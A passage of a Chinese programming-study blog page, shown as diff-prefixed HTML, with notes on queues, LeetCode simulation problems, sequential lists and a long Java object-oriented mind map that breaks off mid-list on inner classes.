+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/04/07/%E7%9B%AE%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/04/07/%E7%9B%AE%E5%BD%95/" class="post-title-link" itemprop="url">队列</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-07 14:43:56" itemprop="dateCreated datePublished" datetime="2024-04-07T14:43:56+08:00">2024-04-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-10 23:24:54" itemprop="dateModified" datetime="2024-05-10T23:24:54+08:00">2024-05-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">基础数据结构</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>​        <strong>一、队列的概念</strong></p>
+<p>​        <strong>二、入队</strong></p>
+<p>​        <strong>三、出队</strong></p>
+<p>​        <strong>四、获取队首元素</strong></p>
+<h2 id="一、队列的概念"><a href="#一、队列的概念" class="headerlink" title="一、队列的概念"></a>一、队列的概念</h2><p>​      队列是仅限在表尾进行插入，表头进行删除的线性表<strong>，</strong>它遵循先进先出（First-In-First-Out，FIFO）的原则。队列就像排队等候的人群一样，最先进入队列的元素将首先被处理或移除。</p>
+<p>​      在计算机科学中，队列通常用于实现 排队系统、任务调度、消息传递（消息队列可用于进程间通信）。我们一般可以用 顺序表 或者 链表 来实现队列。</p>
+<h2 id="二、入队"><a href="#二、入队" class="headerlink" title="二、入队"></a>二、入队</h2><h3 id="1、入队的概念"><a href="#1、入队的概念" class="headerlink" title="1、入队的概念"></a>1、入队的概念</h3><p>​      队列的插入操作叫做入队，它是将数据元素从队尾进行插入的过程。</p>
+<h3 id="2、入队的图解"><a href="#2、入队的图解" class="headerlink" title="2、入队的图解"></a>2、入队的图解</h3><p>​      如图所示，4 号元素是原先的队尾，在它后面插入一个元素 6，就完成了入队的过程。</p>
+<p><img src="/pic/21.gif" alt="21"></p>
+<h3 id="3、入队的步骤"><a href="#3、入队的步骤" class="headerlink" title="3、入队的步骤"></a>3、入队的步骤</h3><p>​       第1步、将元素添加到队列尾部，更新队尾指针（适用于链表）或者索引（适用于顺序表）。</p>
+<p>​       第2步、队列大小增加 1。</p>
+<h2 id="三、出队"><a href="#三、出队" class="headerlink" title="三、出队"></a>三、出队</h2><h3 id="1、出队的概念"><a href="#1、出队的概念" class="headerlink" title="1、出队的概念"></a>1、出队的概念</h3><p>​      队列的删除操作叫做出队，它是将队首元素进行删除的过程。</p>
+<h3 id="2、出队的图解"><a href="#2、出队的图解" class="headerlink" title="2、出队的图解"></a>2、出队的图解</h3><p>​      如图所示，直接删除队首的元素，并且更新为新的队首即可。</p>
+<p><img src="/pic/22.gif" alt="22"></p>
+<h3 id="3、出队的步骤"><a href="#3、出队的步骤" class="headerlink" title="3、出队的步骤"></a>3、出队的步骤</h3><p>​      第1步、删除队首元素，更新队首指针（适用于链表）或者索引（适用于顺序表）。</p>
+<p>​      第2步、队列的大小减小 1。</p>
+<h2 id="四、获取队首元素"><a href="#四、获取队首元素" class="headerlink" title="四、获取队首元素"></a>四、获取队首元素</h2><h3 id="1、获取队首元素的概念"><a href="#1、获取队首元素的概念" class="headerlink" title="1、获取队首元素的概念"></a>1、获取队首元素的概念</h3><p>​      返回队首指针（或者索引）指向的元素的值，无论是链表还是顺序表，都可以通过队首指针（或者索引）在 O(1) 的时间复杂度获取到队首元素。</p>
+<h3 id="2、获取队首元素的图解"><a href="#2、获取队首元素的图解" class="headerlink" title="2、获取队首元素的图解"></a>2、获取队首元素的图解</h3><p>​      如图所示，直接通过队首指针（或者索引）获取队首元素。</p>
+<p><img src="/pic/23.gif" alt="23"></p>
+<h3 id="3、获取队首元素的步骤"><a href="#3、获取队首元素的步骤" class="headerlink" title="3、获取队首元素的步骤"></a>3、获取队首元素的步骤</h3><p>​       第1步、利用队首指针（或者索引）获取队首元素并返回。由于是查询操作，所以不会改变队列本身的数据；</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/03/27/khpcZxM76EHGOkyA/khpcZxM76EHGOkyA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/27/khpcZxM76EHGOkyA/khpcZxM76EHGOkyA/" class="post-title-link" itemprop="url">模拟</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-27 22:57:20" itemprop="dateCreated datePublished" datetime="2024-03-27T22:57:20+08:00">2024-03-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-10 23:22:42" itemprop="dateModified" datetime="2024-05-10T23:22:42+08:00">2024-05-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/%E5%9F%BA%E7%A1%80%E6%9A%B4%E5%8A%9B%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">基础暴力算法</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一、数据结构"><a href="#一、数据结构" class="headerlink" title="一、数据结构"></a>一、数据结构</h1><p>  对于模拟题而言，最关键的其实是数据结构，看到一个问题，选择合适的数据结构，然后根据问题来实现对应的功能。模拟题的常见数据结构主要就是：数组、字符串、矩阵、链表、二叉树 等等。</p>
+<h2 id="1、基于数组"><a href="#1、基于数组" class="headerlink" title="1、基于数组"></a>1、基于数组</h2><p>  利用数组的数据结构，根据题目要求，去实现算法，如：1920.基于排列构建数组、1389.按既定顺序创建目标数组、1603.设计停车系统、2149.按符号重排数组、2221.数组的三角和</p>
+<h2 id="2、基于字符串"><a href="#2、基于字符串" class="headerlink" title="2、基于字符串"></a>2、基于字符串</h2><p>  利用字符串的数据结构，根据题目要求，去实现算法，如：2011.执行操作后的变量值、2744.最大字符串配对数目、LCP 17.速算机器人、537.复数乘法</p>
+<h2 id="3、基于链表"><a href="#3、基于链表" class="headerlink" title="3、基于链表"></a>3、基于链表</h2><p>  利用链表的数据结构，根据题目要求，去实现算法，如：2181.合并零之间的节点、1823.找出游戏的获胜者</p>
+<h2 id="4、基于矩阵"><a href="#4、基于矩阵" class="headerlink" title="4、基于矩阵"></a>4、基于矩阵</h2><p>  利用矩阵的数据结构，根据题目要求，去实现算法，如：2120.执行所有后缀指令、1252.奇数值单元格的数目、832.翻转图像、657.机器人能否返回原点、289.生命游戏、59.螺旋矩阵 II、885.螺旋矩阵 III</p>
+<h2 id="5、基于栈"><a href="#5、基于栈" class="headerlink" title="5、基于栈"></a>5、基于栈</h2><p>  利用栈的数据结构，如：1441.用栈操作构建数组</p>
+<h2 id="6、基于队列"><a href="#6、基于队列" class="headerlink" title="6、基于队列"></a>6、基于队列</h2><p>  利用队列的数据结构，如：1700.无法吃午餐的学生数量</p>
+<h1 id="二、算法技巧"><a href="#二、算法技巧" class="headerlink" title="二、算法技巧"></a>二、算法技巧</h1><p>  模拟时一般会用到一些算法技巧，或者说混合算法，比如 排序、递归、迭代 等等。</p>
+<h2 id="1、排序"><a href="#1、排序" class="headerlink" title="1、排序"></a>1、排序</h2><p>  排序后，干一件事情，如：950.按递增顺序显示卡牌</p>
+<h2 id="2、递归"><a href="#2、递归" class="headerlink" title="2、递归"></a>2、递归</h2><p>  需要借助递归来实现，如：1688.比赛中的配对次数 、2169.得到 0 的操作数、258.各位相加</p>
+<h2 id="3、迭代"><a href="#3、迭代" class="headerlink" title="3、迭代"></a>3、迭代</h2><p>  不断迭代求解，其实就是利用 while 循环来实现功能，如：1860.增长的内存泄露、258.各位相加</p>
+<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/03/14/fpmPrhXnBqw1njOC/fpmPrhXnBqw1njOC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/14/fpmPrhXnBqw1njOC/fpmPrhXnBqw1njOC/" class="post-title-link" itemprop="url">顺序表</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-03-14 16:26:58" itemprop="dateCreated datePublished" datetime="2024-03-14T16:26:58+08:00">2024-03-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" itemprop="url" rel="index"><span itemprop="name">基础数据结构</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h4><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="顺序表是一种线性的数据结构，其中数据元素按照特定的顺序依次存储在连续的内存空间中。它由一系列元素组成，每个元素都与唯一的索引（或者叫下标）相关联，索引从-0-开始递增。"><a href="#顺序表是一种线性的数据结构，其中数据元素按照特定的顺序依次存储在连续的内存空间中。它由一系列元素组成，每个元素都与唯一的索引（或者叫下标）相关联，索引从-0-开始递增。" class="headerlink" title="顺序表是一种线性的数据结构，其中数据元素按照特定的顺序依次存储在连续的内存空间中。它由一系列元素组成，每个元素都与唯一的索引（或者叫下标）相关联，索引从 0 开始递增。"></a>顺序表是一种线性的数据结构，其中数据元素按照特定的顺序依次存储在连续的内存空间中。它由一系列元素组成，每个元素都与唯一的索引（或者叫下标）相关联，索引从 0 开始递增。</h2><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
+      
+    </div>
+
+    
+    
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://xloudmax.fun/2024/03/13/KEWkzDYOuISyvw4u/KEWkzDYOuISyvw4u/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Xloudmax">
+      <meta itemprop="description" content="Welc0me t0 the base">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xloudmax">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/03/13/KEWkzDYOuISyvw4u/KEWkzDYOuISyvw4u/" class="post-title-link" itemprop="url">思维导图测试</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-13 23:00:52 / 修改时间：23:07:31" itemprop="dateCreated datePublished" datetime="2024-03-13T23:00:52+08:00">2024-03-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><h2 id="类（实例）"><a href="#类（实例）" class="headerlink" title="类（实例）"></a>类（实例）</h2><h3 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h3><ul>
+<li><p>对象（object）<br>对象是类的一个实例</p>
+<ul>
+<li><p>new调用类的构造器<br>var p = new Person()</p>
+<ul>
+<li><p>声明</p>
+<ul>
+<li>Person p;</li>
+</ul>
+</li>
+<li><p>实例化</p>
+<ul>
+<li><p>p变量（引用变量）只在栈内存中存储了一个地址值<br>可以有多个指向同一个对象</p>
+</li>
+<li><p>Person<br>对象存放在堆<br>（heap）内存<br>无指向时被回收</p>
+</li>
+</ul>
+</li>
+<li><p>初始化</p>
+<ul>
+<li>p = new Person();</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>对象的属性</p>
+<ul>
+<li><p>成员变量（域）field</p>
+<ul>
+<li><p>用于定义该类或该类的实例所包含的状态数据<br>[修饰符] 类型 成员变量名 [=默认值]</p>
+<ul>
+<li><p>实例变量（对象属性） instance 独立</p>
+<ul>
+<li><p>实例.实例变量<br>类.类变量<br>实例.类变量（不推荐）</p>
+</li>
+<li><p>setter和getter方法</p>
+<ul>
+<li><p>setXxx()<br>getXxx()</p>
+</li>
+<li><p>用于操作对象属性的常见模式，允许访问封装对象的状态并提供对属性的控制和访问</p>
+</li>
+<li><p>setter和getter方法合起来变成属性，如果只有getter方法，则是只读属性</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>类变量（static）共享</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>对象的作用</p>
+<ul>
+<li><p>封装数据和行为</p>
+</li>
+<li><p>访问对象的实例变量</p>
+</li>
+<li><p>调用对象的方法</p>
+</li>
+</ul>
+</li>
+<li><p>this关键字</p>
+<ul>
+<li><p>让类中一个方法，访问该类里的另一个方法或实例变量</p>
+</li>
+<li><p>所代表的只能是当前<br>类的实例</p>
+</li>
+<li><p>this作为对象的默认引用</p>
+<ul>
+<li><p>构造器中引用该构造器正在初始化的对象</p>
+</li>
+<li><p>方法中引用调用该方法的对象</p>
+</li>
+</ul>
+</li>
+<li><p>一个方法访问该类中定义的其他方法、成员变量时，<br>加不加this前缀的效果是完全一样的，this仍然存在</p>
+</li>
+<li><p>static修饰的方法中不能使用this引用<br>静态成员不能<br>直接访问非静态成员</p>
+</li>
+<li><p>如果构造器中有一个与成员变量同名的局部变量，又必须在构造器中访问这个被覆盖的成员变量，则必须使用this前缀</p>
+</li>
+</ul>
+</li>
+<li><p>实例初始化块</p>
+<ul>
+<li><p>用于初始化对象的实例成员变量，在构造器执行之前执行</p>
+</li>
+<li><p>实例初始化块是在创建Java对象时隐式执行的，<br>总是全部执行，因此可以把多个实例初始化块合并成一个实例<br>初始化块，从而可以让程序更加简洁，可读性更强。</p>
+</li>
+<li><p>如果有一段初始化处理代码对所有对象完全相同，且无须接收<br>任何参数，就可以把这段初始化处理代码提取到实例初始化块中</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><em>对象调用方法<br>方法属于对象</em></p>
+</li>
+<li><p>方法（method）（形参）<br>类似于函数、但必须包含在类里</p>
+<ul>
+<li><p>方法的参数传递方式只有一种：值传递。就是将实际参数值的副本（复制品）传入方法内，而参数本身不会受到任何影响。</p>
+</li>
+<li><p>[修饰符] 方法返回值类型（void） 方法名（形参列表）<br>{<br>可执行性语句组成的方法体<br>}</p>
+</li>
+<li><p>执行方法</p>
+<ul>
+<li><p>类调用（static）</p>
+</li>
+<li><p>对象调用</p>
+</li>
+</ul>
+</li>
+<li><p>定义局部变量</p>
+<ul>
+<li>形参（方法签名中定义）</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>方法局部变量（方法内定义）</p>
+<p>代码块局部变量（代码块内定义）</p>
+<pre><code>        - 局部变量不属于任何类或实例，总是保存在栈内存中，保存基本变量的值和引用变量的地址
+
+        - 局部变量定义后，必须经过显式初始化后才能使用
+
+        - 能用代码块局部变量就不用方法局部变量
+
+            - 扩大了变量的作用域，这不利于提高程序的内聚性。
+
+            - 增大了变量的生存时间，这将导致更大的内存开销。
+
+- 在方法中创建实例 var p = new Person（）
+                                   实例化
+
+- 个数可变的形参（只能有一个）
+
+- 递归方法
+
+    - 基准情形
+
+    - 不断推进
+
+        - 向已知基准情形推进
+
+    - 设计法则
+
+        - 假设所有的递归调用都能执行
+
+    - 合成效益法则
+
+        - 求解同一问题时，切勿做重复性的工作
+
+- 方法重载(Overload)
+
+    - 只要形参列表不同 ，可以有多个同名方法
+
+    - 两同一不同
+
+        - 方法名必须相同（&quot;两同&quot;），但参数列表必须不同（&quot;一不同&quot;）
+
+    - 返回值不能区分重载
+
+- toString()方法
+
+    - 返回对象的类名，后跟对象的散列码（hash code）
+
+    - 所有的Java对象都可以和字符串进行连接运算，系统自动调用Java对象
+</code></pre><p>toString()方法的返回值和字符串进行连接运算</p>
+<pre><code>- equals()方法
+
+    - Object类提供的一个实例方法，经常被重写使用
+
+        -  ➢自反性：对任意x, x.equals(x)一定返回true
+
+        - ➢ 对称性 ： 对任意x和y, 如果y.equals(x)返回 true，则x.equals(y)也返回true
+
+        - ➢ 传 递 性 ： 对任意x,y,z,如果x.equals(y)返回ture,y.equals(z)返回true，则x.equals(z)一定返回true
+
+        - ➢ 一致性：对任意x和y, 如果对象中用于等价比较的信息没有改变, 那么无论调用x.equals(y)多少次，返回的结果应该保持一致，要么一直是true，要么一直是false
+
+        - ➢ 对任何不是null的x, x.equals(null)一定返回false
+</code></pre><h3 id="成员"><a href="#成员" class="headerlink" title="成员"></a>成员</h3><ul>
+<li><p>类成员<br>（必须通过类来访问、调用）</p>
+<ul>
+<li><p>类成员（包括成员变量、方法、初始化块、内部类和内部枚举）不能访问<br>实例成员（包括成员变量、方法、初始化块、内部类和内部枚举）</p>
+</li>
+<li><p>类方法</p>
+<ul>
+<li>修饰符 static （void）方法名（形参列表）{<br>}<br>public static void test（）{}</li>
+</ul>
+</li>
+<li><p>类变量</p>
+<ul>
+<li><p>public（修饰符） static 变量名（abcABC)<br>[=默认值]</p>
+</li>
+<li><p>类变量生存范围几乎等同于该类的生存范围</p>
+</li>
+<li><p>类变量必须通过类来访问</p>
+</li>
+</ul>
+</li>
+<li><p>类初始化块 </p>
+<ul>
+<li><p>负责对类进行初始化，总是比实例初始化块先执行</p>
+</li>
+<li><p>执行类初始化块时，系统会按照继承关系逐级上溯（到java.lang.Object类），执行每个父类的类初始化块，然后才执行当前类的类初始化块。</p>
+</li>
+<li><p>static {可执行性代码}</p>
+<ul>
+<li>初始化块的修饰符只能是static，使用static修饰的初始化块被<br>称为类初始化块（静态初始化块），没有static修饰的初始化块被称<br>为实例初始化块（非静态初始化块）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>构造器</p>
+<ul>
+<li><p>public（修饰符） 构造器名（形参列表）<br>{构造器执行体}（构造器必须与类名相同）</p>
+<ul>
+<li><p>没有定义构造器，系统将为它提供一个默<br>认的构造器，系统提供的构造器总是没有参数的</p>
+</li>
+<li><p>通过new关键字来调用构造器，从而返回该类<br>的实例</p>
+</li>
+<li><p>一旦为一个类提供了构造器，系统将不再为该类提供构造<br>器</p>
+</li>
+<li><p>返回值是隐式的</p>
+</li>
+</ul>
+</li>
+<li><p>构造器是创建对象的重要途径，Java类必须包含一个或一个以上的构造器。</p>
+</li>
+<li><p>构造器的重载</p>
+<ul>
+<li>如果一个构造器B完全包含了另一个构造器A，可以使用this关键字来调用构造器A，不会创建新的对象实例。这称为构造器重载，在一个构造器中调用另一个构造器以共享初始化代码。可以避免重复的初始化代码，并确保对象的一致性。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>内部类</p>
+<ul>
+<li><p>public class OuterClass<br>{<br>//此处可以定义内部类<br>}</p>
+</li>
+<li><p>作用</p>
+<ul>
+<li><p>➢ 内部类提供了更好的封装，可以把内部类隐藏在外部类之内，不允许同一个包中的其他类访问该类。假设需要创建Cow类，Cow类需要组合一个CowLeg对象，CowLeg类只有在Cow类里才有效，离开了Cow类之后没有任何意义。在这种情况下，就可把CowLeg定义成Cow的内部类，不允许其他类访问CowLeg</p>
+</li>
+<li><p>➢ 内部类成员可以直接访问外部类的私有数据，因为内部类被当成其外部类成员，同一个类的成员之间可以互相访问。但外部类不能访问内部类的实现细节，例如内部类的成员变量</p>
+</li>
+<li><p>➢ 匿名内部类适合用于创建那些仅需要一次使用的类。对于前面介绍的命令模式，当需要传入一个Command对象时，重新专门定义PrintCommand和SquareCommand两个实现类可能没有太大的意义，因为这两个实现类可能仅需要使用一次。在这种情况下，使用匿名内部类将更方便</p>
+</li>
+</ul>
+</li>
+<li><p>区别</p>
+<ul>
+<li><p>➢ 内部类比外部类可以多使用三个修饰符:private 、protected、static.外部类不可以使用这三个修饰符</p>
+</li>
+<li><p>➢ 非静态内部类不能拥有静态成员</p>
+</li>
+</ul>
+</li>
+<li><p>4个作用域：同一个类、同一个包、父子类和任何位置，可以使用任意访问控制符<br>如private、protected和public等修饰</p>
+</li>
+<li><p>成员内部类</p>
+<ul>
+<li><p>class文件总是这种形式 ：<br>OuterClass$InnerClass.class</p>
+</li>
+<li><p>非静态内部类</p>
+<ul>
+<li><p>可以直接访问外部类的private成<br>员</p>
+</li>
+<li><p>保存<br>了一个它所寄生的外部类对象的引用（当调用非静态内部类的实例方<br>法时，必须有一个非静态内部类实例，非静态内部类实例必须寄生在<br>外部类实例里）</p>
+</li>
+<li><p>访问某个变量时，方法内-内部类内-包含内部类的外部类内</p>
+</li>
+<li><p>如果外部类成员变量、内部类成员变量与内部类里方法的<br>局部变量同名，则可通过使用this、外部类类名.this作为限定来区<br>分</p>
+</li>
+<li><p>非静态内部类可以访问外部类的实例成员，但外部类无法直接访问非静态内部类的实例成员。如果外部类需要访问非静态内部类的实例成员，必须通过创建内部类的实例来实现</p>
+<ul>
+<li>当外部类对象被实例化时，非静态内部类的对象并不会自动存在或被创建</li>
+</ul>
+</li>
+<li><p>创建一个非静态内部类的实例，那么它一定会关联到一个外部类对象</p>
+<ul>
+<li>外部类可以独立存在，而不包含内部类的实例</li>
+</ul>
+</li>
+<li><p>不允许在外部类的静态成员中直接使用非<br>静态内部类</p>
+</li>
+<li><p>不允许在非静态内部类里定义静态成员</p>
+</li>
+<li><p>不可以有静态初始化块，但可以包含普通初始<br>化块。非静态内部类普通初始化块的作用与外部类初始化块的作用<br>完全相同</p>
+</li>
+</ul>
+</li>
+<li><p>静态内部类（static<br>修饰，类内部类）<br>使用static修饰可以将内部类变成外部类<br>相关，而不是外部类实例相关</p>
+<ul>
+<li><p>类可以包含静态成员，也可以包含非静态成员</p>
+</li>
+<li><p>静态内部类不能访问外部类的实<br>例成员，只能访问外部类的类成员</p>
+</li>
+<li><p>即使是静态内部类的实例方法也<br>不能访问外部类的实例成员，只能访问外部类的静态成员</p>
+</li>
+<li><p>静态内部类对象只持有外部类的类引用，没有<br>持有外部类对象的引用</p>
+</li>
+<li><p>允许在接口里定义内部类，接口里定义的内部<br>类默认使用public static修饰，也就是说，接口内部类只能是静态内<br>部类</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>使用内部类</p>
+<ul>
+<li><p>在外部类内部使用内部类</p>
+<ul>
+<li><p>通过 new 关键字调用内部类的构造器来创建实例</p>
+</li>
+<li><p>不要在外部类的静态成员（包括静态方<br>法和静态初始化块）中使用非静态内部类</p>
+</li>
+<li><p>可以在外部类内部定义内部类的子类</p>
+</li>
+</ul>
+</li>
+<li><p>在外部类以外使用非静态内部类</p>
+<ul>
+<li><p>访问控制权限</p>
+<ul>
+<li><p>Private访问控制权限：不允许在外部类以外访问</p>
+</li>
+<li><p>Public访问控制权限：允许在任何地方访问。</p>
+</li>
+<li><p>省略访问控制符：只能在与外部类位于同一包中的其他类中访问。</p>
+</li>
+<li><p>Protected访问控制权限：允许在与外部类位于同一包中的其他类和外部类的子类中访问</p>
+</li>
+</ul>
+</li>
+<li><p>内部类的完整类名</p>
+<ul>
+<li>在外部类以外使用内部类时，内部类的完整类名：OuterClass.InnerClass varName。如果外部类有包名，则还应该增加包名前缀</li>
+</ul>
+</li>
+<li><p>创建非静态内部类的实例</p>
+<ul>
+<li>在外部类以外创建非静态内部类的实例时，需要使用外部类实例和 new 调用内部类的构造器<br>outerInstance.new InnerConstructor()</li>
+</ul>
+</li>
+<li><p>创建非静态内部类的子类的实例</p>
+<ul>
+<li>当创建非静态内部类的子类时，子类的构造器需要调用父类内部类的构造器，并且在构造子类的实例时需要确保外部类的实例存在</li>
+</ul>
+</li>
+<li><p>注意事项</p>
+<ul>
+<li><p>静态成员无法访问非静态内部类，因为非静态内部类依赖于外部类对象的存在，而静态成员不依赖于具体对象的存在</p>
+</li>
